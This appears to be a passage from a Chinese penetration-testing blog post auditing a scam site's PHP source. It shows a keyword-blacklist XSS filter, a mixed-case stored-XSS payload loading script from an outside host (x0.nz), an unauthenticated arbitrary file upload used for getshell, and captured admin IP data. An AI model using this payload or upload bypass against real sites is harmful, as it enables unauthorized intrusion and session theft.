<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SafeFilter</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ra = <span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>, <span class="string">'/script/'</span>, <span class="string">'/javascript/'</span>, <span class="string">'/vbscript/'</span>, <span class="string">'/expression/'</span>, <span class="string">'/applet/'</span>, <span class="string">'/meta/'</span>, <span class="string">'/xml/'</span>, <span class="string">'/blink/'</span>, <span class="string">'/link/'</span>, <span class="string">'/style/'</span>, <span class="string">'/embed/'</span>, <span class="string">'/object/'</span>, <span class="string">'/frame/'</span>, <span class="string">'/layer/'</span>, <span class="string">'/title/'</span>, <span class="string">'/bgsound/'</span>, <span class="string">'/base/'</span>, <span class="string">'/onload/'</span>, <span class="string">'/onunload/'</span>, <span class="string">'/onchange/'</span>, <span class="string">'/onsubmit/'</span>, <span class="string">'/onreset/'</span>, <span class="string">'/onselect/'</span>, <span class="string">'/onblur/'</span>, <span class="string">'/onfocus/'</span>, <span class="string">'/onabort/'</span>, <span class="string">'/onkeydown/'</span>, <span class="string">'/onkeypress/'</span>, <span class="string">'/onkeyup/'</span>, <span class="string">'/onclick/'</span>, <span class="string">'/ondblclick/'</span>, <span class="string">'/onmousedown/'</span>, <span class="string">'/onmousemove/'</span>, <span class="string">'/onmouseout/'</span>, <span class="string">'/onmouseover/'</span>, <span class="string">'/onmouseup/'</span>, <span class="string">'/onunload/'</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_array($arr)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_array($value)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!get_magic_quotes_gpc()) &#123;</span><br><span class="line">                    $value = addslashes($value);                              <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与NUL（NULL字符）加上反斜线转义</span></span><br><span class="line">                &#125;</span><br><span class="line">                $value = preg_replace($ra, <span class="string">''</span>, $value);      <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">                $arr[$key] = $value;                                       <span class="comment">//去除 HTML 和 PHP 标记并转换为HTML实体</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;SafeFilter($arr[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SafeFilter函数过滤xss，可以看到是字符传入判断，这个大小写绕过就行</p>
<p>因参数过滤不足，在前台身份证认证存在xss漏洞，大小写绕过插入数据库，后台无实体化过滤，从而产生储存型xss</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=<span class="comment">//x0.nz/X123&gt;&lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="rce-前后台任意文件上传getshell"><a href="#rce-前后台任意文件上传getshell" class="headerlink" title="rce 前后台任意文件上传getshell"></a>rce 前后台任意文件上传getshell</h4><p>\system\mod\admin\config.mod.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'发生错误'</span>));<span class="keyword">exit</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/png"</span>||$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/jpeg"</span>)&amp;&amp;$_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>]&lt;<span class="number">1024000</span>)&#123;</span><br><span class="line">				$filename =substr(strrchr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">				$filename =<span class="string">"./static/upload/"</span>.date(<span class="string">'Ymd'</span>,time()).<span class="keyword">$this</span>-&gt;getMillisecond().<span class="string">'.'</span>.$filename;</span><br><span class="line">				<span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">					<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'刷新后重试'</span>));<span class="keyword">exit</span>();</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">					move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$filename);</span><br><span class="line">					<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">0</span>,<span class="string">'msg'</span>=&gt;$filename));<span class="keyword">exit</span>();    </span><br><span class="line">				&#125;        </span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'类型不允许'</span>));<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件未做身份限制，文件名未做后缀限制，可任意访问，上传文件。</p>
<p><img src="https://s1.ax1x.com/2020/08/25/dgMotO.png" alt="dgMotO.png"></p>
<hr>
<h3 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h3><p>通过上述审计出的漏洞，获取到服务器权限，并且通过xss落地该团伙位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">落地时间,网站地址,域名,落地ip,端口,落地</span><br><span class="line">2020-05-24 17:12:37,http:&#x2F;&#x2F;xxx.com&#x2F;admin.php,xxx.com,112.1.2.1,57217,中国 江苏 苏州</span><br></pre></td></tr></table></figure>

<p>该犯罪团伙订单数6万余条</p>
<p><img src="https://s1.ax1x.com/2020/08/17/dZPHDs.png" alt="1597605596(1)"></p>
<p>传销2万多用户</p>
<p><img src="https://s1.ax1x.com/2020/08/17/dZiSv4.png" alt=""></p>
<p>难以想象的是，如此拙劣的骗术，为什么还会有这么多人受骗？跟朋友py交易完就开溜，莫贪心。</p>
<p>谢谢观看!</p>
<hr>
<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p><a href="https://imgchr.com/i/dg3M8S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/08/25/dg3M8S.png" alt="dg3M8S.png"></a></p>
<p>1、渗透测试总获取到网站源码是很关键因素，获取到源码相当于摸清网站所有得结构</p>
<p>2、信息收集对渗透测试得重要性，获取到目标越多信息，对渗透测试越有利</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Sxadmin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sxadmin.github.io/2021/08/19/%E6%B8%97%E9%80%8F%E6%9C%89%E9%92%B1%E8%BF%98%E7%B3%BB%E7%BB%9F/">https://sxadmin.github.io/2021/08/19/%E6%B8%97%E9%80%8F%E6%9C%89%E9%92%B1%E8%BF%98%E7%B3%BB%E7%BB%9F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sxadmin.github.io" target="_blank">Sxadmin blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cover63.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2021/08/27/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/"><img class="prev_cover" src="/img/cover/cover63.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">祥云杯wp</div></div></a></div><div class="next-post pull_right"><a href="/2021/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"><img class="next_cover" src="/img/cover/cover61.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">强网杯wp</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Sxadmin</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script></body></html>